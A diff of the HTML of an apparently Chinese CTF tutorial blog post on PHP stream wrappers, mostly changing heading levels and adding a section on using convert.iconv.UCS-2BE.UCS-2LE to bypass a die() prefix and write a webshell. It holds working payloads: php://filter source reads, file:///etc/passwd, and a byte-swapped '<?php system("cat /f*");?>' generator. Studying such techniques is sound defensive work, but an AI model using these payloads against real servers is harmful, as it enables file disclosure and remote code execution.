@@ -228,7 +228,7 @@
         </header>
 
         <div class="post-content">
-            <h1 id="PHP伪协议从入门到入坟"><a href="#PHP伪协议从入门到入坟" class="headerlink" title="PHP伪协议从入门到入坟"></a>PHP伪协议从入门到入坟</h1><h2 id="什么是PHP伪协议"><a href="#什么是PHP伪协议" class="headerlink" title="什么是PHP伪协议"></a>什么是PHP伪协议</h2><p>PHP内置的URL风格协议处理器（wrappers），以 <code>scheme://...</code> 的形式使用，用于访问各种数据流。不是真正的网络协议，而是PHP内部定义的数据流封装方式。</p>
+            <h1 id="PHP伪协议从入门到入坟"><a href="#PHP伪协议从入门到入坟" class="headerlink" title="PHP伪协议从入门到入坟"></a>PHP伪协议从入门到入坟</h1><h1 id="什么是PHP伪协议"><a href="#什么是PHP伪协议" class="headerlink" title="什么是PHP伪协议"></a>什么是PHP伪协议</h1><p>PHP内置的URL风格协议处理器（wrappers），以 <code>scheme://...</code> 的形式使用，用于访问各种数据流。不是真正的网络协议，而是PHP内部定义的数据流封装方式。</p>
 <p><strong>官方文档</strong>：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
 <h3 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h3><p>任何接受文件路径的PHP函数（<code>include</code>、<code>file_get_contents</code>、<code>fopen</code>、<code>require</code> 等）都可以用伪协议替换路径。</p>
 <h3 id="关键配置"><a href="#关键配置" class="headerlink" title="关键配置"></a>关键配置</h3><table>
@@ -251,7 +251,7 @@
 </tr>
 </tbody></table>
 <hr>
-<h2 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p>访问本地文件系统。</p>
+<h1 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h1><p>访问本地文件系统。</p>
 <h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///path/to/file</span><br></pre></td></tr></table></figure>
 
 <p>三根斜杠：<code>file://</code> + 绝对路径的 <code>/</code>。</p>
@@ -266,7 +266,7 @@
 
 <p><code>file:///etc/passwd</code> 会变成 <code>file:///etc/passwd.php</code>，文件不存在，此时需要其他协议解决。</p>
 <hr>
-<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>在读取文件时对内容做加工，再交给PHP引擎处理。</p>
+<h1 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h1><p>在读取文件时对内容做加工，再交给PHP引擎处理。</p>
 <h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=&lt;过滤器&gt;/resource=&lt;目标文件&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="核心价值"><a href="#核心价值" class="headerlink" title="核心价值"></a>核心价值</h3><p>读PHP文件时，如果不做处理直接 <code>include</code>，PHP会解析执行代码，看不到源码。filter 可以在读取后、交给PHP引擎前，<strong>先对内容进行编码转换</strong>，让PHP不再把它当作代码执行，而是直接输出编码后的文本。</p>
@@ -275,12 +275,6 @@
 <p>流程：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config.php 原始内容 → convert.base64-encode 编码 → 交给 include</span><br><span class="line">→ 输出 Base64 字符串（不是PHP代码，不会被执行）</span><br><span class="line">→ 解码后即可看到源码</span><br></pre></td></tr></table></figure>
 
-<h3 id="关于-php-拼接"><a href="#关于-php-拼接" class="headerlink" title="关于 .php 拼接"></a>关于 .php 拼接</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>
-<p>实际拼接后：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<p><code>.php</code> 被拼到 <code>resource</code> 参数的值后面，正好补全了文件名，所以能正常读取。</p>
 <h3 id="常用过滤器"><a href="#常用过滤器" class="headerlink" title="常用过滤器"></a>常用过滤器</h3><table>
 <thead>
 <tr>
@@ -318,8 +312,81 @@
 <h3 id="多个过滤器串联"><a href="#多个过滤器串联" class="headerlink" title="多个过滤器串联"></a>多个过滤器串联</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode|string.rot13/resource=flag.php</span><br></pre></td></tr></table></figure>
 
 <p>从左到右依次处理：先Base64编码，再做ROT13。</p>
+<h3 id="关于-php-拼接"><a href="#关于-php-拼接" class="headerlink" title="关于 .php 拼接"></a>关于 .php 拼接</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>
+<p>实际拼接后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p><code>.php</code> 被拼到 <code>resource</code> 参数的值后面，正好补全了文件名，所以能正常读取。</p>
+<h3 id="convert-iconv-—-字符编码转换过滤器（写模式进阶）"><a href="#convert-iconv-—-字符编码转换过滤器（写模式进阶）" class="headerlink" title="convert.iconv.* — 字符编码转换过滤器（写模式进阶）"></a>convert.iconv.* — 字符编码转换过滤器（写模式进阶）</h3><p>前面讲的都是 <strong>read 模式</strong>（读文件时编码），<code>convert.iconv.*</code> 还有一个重要用途是 <strong>write 模式</strong>（写文件时编码转换）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.iconv.UCS-2BE.UCS-2LE/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="核心原理：UCS-2BE-UCS-2LE"><a href="#核心原理：UCS-2BE-UCS-2LE" class="headerlink" title="核心原理：UCS-2BE &#x2F; UCS-2LE"></a>核心原理：UCS-2BE &#x2F; UCS-2LE</h4><p><strong>UCS-2</strong> 是一种字符编码，每个字符固定占 <strong>2 个字节</strong>。</p>
+<table>
+<thead>
+<tr>
+<th align="center">字符</th>
+<th align="center">对应数字</th>
+<th align="center">UCS-2 的 2 个字节</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>&lt;</code></td>
+<td align="center"><code>0x003C</code></td>
+<td align="center"><code>0x00 0x3C</code></td>
+</tr>
+<tr>
+<td align="center"><code>?</code></td>
+<td align="center"><code>0x003F</code></td>
+<td align="center"><code>0x00 0x3F</code></td>
+</tr>
+<tr>
+<td align="center"><code>p</code></td>
+<td align="center"><code>0x0070</code></td>
+<td align="center"><code>0x00 0x70</code></td>
+</tr>
+</tbody></table>
+<p><strong>BE（Big Endian）</strong> 和 <strong>LE（Little Endian）</strong> 是这 2 个字节的存放顺序：</p>
+<table>
+<thead>
+<tr>
+<th align="center">方式</th>
+<th align="left">含义</th>
+<th align="center">存放 <code>&lt;</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>BE</strong></td>
+<td align="left"><strong>高位在前</strong>（正常顺序）</td>
+<td align="center"><code>[0x00] [0x3C]</code></td>
+</tr>
+<tr>
+<td align="center"><strong>LE</strong></td>
+<td align="left"><strong>低位在前</strong>（反过来）</td>
+<td align="center"><code>[0x3C] [0x00]</code></td>
+</tr>
+</tbody></table>
+<h4 id="实际效果：每-2-个字节交换顺序"><a href="#实际效果：每-2-个字节交换顺序" class="headerlink" title="实际效果：每 2 个字节交换顺序"></a>实际效果：每 2 个字节交换顺序</h4><p><code>UCS-2BE → UCS-2LE</code> 就是把每 2 个字节交换位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">原始:  [3C 3F] [70 68] [70 20] [64 69] [65 28] [29 3B] [3F 3E]</span><br><span class="line">       &lt;  ?    p  h    p       d  i    e  (    )  ;    ?  &gt;</span><br><span class="line"></span><br><span class="line">      ↓ 每对内部交换</span><br><span class="line"></span><br><span class="line">交换后: [3F 3C] [68 70] [20 70] [69 64] [28 65] [3B 29] [3E 3F]</span><br><span class="line">       ?  &lt;    h  p       p    i  d    (  e    ;  )    &gt;  ?</span><br></pre></td></tr></table></figure>
+
+<h4 id="实战用途：绕过-die-写入-webshell"><a href="#实战用途：绕过-die-写入-webshell" class="headerlink" title="实战用途：绕过 die() 写入 webshell"></a>实战用途：绕过 die() 写入 webshell</h4><p>CTF 中常见这种代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
+
+<p>写入的内容前面带 <code>die()</code>，访问文件时直接退出。用 <code>UCS-2BE → UCS-2LE</code> 过滤器打散 <code>die()</code>：</p>
+<p><strong>file 参数：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.iconv.UCS-2BE.UCS-2LE/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>contents 参数：</strong> 把想要的 PHP 代码预先做字节对交换。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用 perl 生成字节交换后的 content</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#x27;</span> | \</span><br><span class="line">perl -e <span class="string">&#x27;my $d=do&#123;local $/;&lt;STDIN&gt;&#125;;for(my $i=0;$i&lt;length($d);$i+=2)&#123;print substr($d,$i+1,1).substr($d,$i,1)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>为什么能绕过：</strong></p>
+<ul>
+<li>前缀 <code>&lt;?php die();?&gt;</code> 中 <code>d i e</code> 三个连续字节被拆分到不同组，变成 <code>i d (</code>，<code>die()</code> 失效</li>
+<li>自己的 payload 预先交换了字节对，经过过滤器后恢复为正常 PHP 代码</li>
+</ul>
+<h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p>当 <code>base64</code>、<code>string</code>、<code>utf</code> 等关键词被过滤时，<code>convert.iconv.UCS-2BE.UCS-2LE</code> 是一个很好的替代方案（<code>UCS</code> 不在常见黑名单中）。</p>
 <hr>
-<h2 id="补充：allow-url-include-详解"><a href="#补充：allow-url-include-详解" class="headerlink" title="补充：allow_url_include 详解"></a>补充：allow_url_include 详解</h2><p>这个配置项控制的是：<strong>能否用 <code>include</code>&#x2F;<code>require</code> 加载远程或非文件形式的数据流</strong>。</p>
+<h1 id="补充：allow-url-include-详解"><a href="#补充：allow-url-include-详解" class="headerlink" title="补充：allow_url_include 详解"></a>补充：allow_url_include 详解</h1><p>这个配置项控制的是：<strong>能否用 <code>include</code>&#x2F;<code>require</code> 加载远程或非文件形式的数据流</strong>。</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">Off</span>   <span class="comment">; 默认关闭</span></span><br></pre></td></tr></table></figure>
 
 <table>
@@ -360,7 +427,7 @@
 </tr>
 </tbody></table>
 <hr>
-<h2 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>读取 HTTP 请求的原始请求体（raw POST body）。</p>
+<h1 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h1><p>读取 HTTP 请求的原始请求体（raw POST body）。</p>
 <h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://input</span><br></pre></td></tr></table></figure>
 
 <h3 id="核心用途"><a href="#核心用途" class="headerlink" title="核心用途"></a>核心用途</h3><p>当 <code>allow_url_include = On</code> 时，把 POST body 的数据交给 <code>include</code> 当作 PHP 代码执行。</p>
@@ -402,7 +469,7 @@
 </tr>
 </tbody></table>
 <hr>
-<h2 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><p>将内联数据直接写在 URL 中作为流使用，不需要 POST 请求。</p>
+<h1 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h1><p>将内联数据直接写在 URL 中作为流使用，不需要 POST 请求。</p>
 <h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://&lt;MIME类型&gt;,&lt;数据&gt;</span><br><span class="line">data://&lt;MIME类型&gt;;base64,&lt;Base64编码的数据&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="与-php-input-的区别"><a href="#与-php-input-的区别" class="headerlink" title="与 php:&#x2F;&#x2F;input 的区别"></a>与 php:&#x2F;&#x2F;input 的区别</h3><table>
@@ -466,14 +533,14 @@
 </tr>
 </tbody></table>
 <hr>
-<h2 id="php-output"><a href="#php-output" class="headerlink" title="php:&#x2F;&#x2F;output"></a>php:&#x2F;&#x2F;output</h2><p>向 HTTP 响应体写入数据，相当于 <code>echo</code>。</p>
+<h1 id="php-output"><a href="#php-output" class="headerlink" title="php:&#x2F;&#x2F;output"></a>php:&#x2F;&#x2F;output</h1><p>向 HTTP 响应体写入数据，相当于 <code>echo</code>。</p>
 <h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://output&#x27;</span>, <span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"><span class="comment">// 等价于 echo &#x27;Hello&#x27;;</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="实际场景"><a href="#实际场景" class="headerlink" title="实际场景"></a>实际场景</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://output&amp;data=test</span><br></pre></td></tr></table></figure>
 <p>数据直接输出到浏览器，不写入文件。（重要性一般，了解即可）</p>
 <hr>
-<h2 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><p>从 ZIP 压缩包中读取文件。</p>
+<h1 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h1><p>从 ZIP 压缩包中读取文件。</p>
 <h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip://&lt;压缩包路径&gt;#&lt;压缩包内文件名&gt;</span><br></pre></td></tr></table></figure>
 
 <p>注意 <code>#</code> 在 URL 中需编码为 <code>%23</code>。</p>
@@ -535,7 +602,7 @@
 </tr>
 </tbody></table>
 <hr>
-<h2 id="glob"><a href="#glob" class="headerlink" title="glob:&#x2F;&#x2F;"></a>glob:&#x2F;&#x2F;</h2><p>按通配符匹配文件路径，<strong>可绕过 <code>open_basedir</code> 限制</strong>。</p>
+<h1 id="glob"><a href="#glob" class="headerlink" title="glob:&#x2F;&#x2F;"></a>glob:&#x2F;&#x2F;</h1><p>按通配符匹配文件路径，<strong>可绕过 <code>open_basedir</code> 限制</strong>。</p>
 <h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">glob://&lt;通配符表达式&gt;</span><br></pre></td></tr></table></figure>
 
 <table>
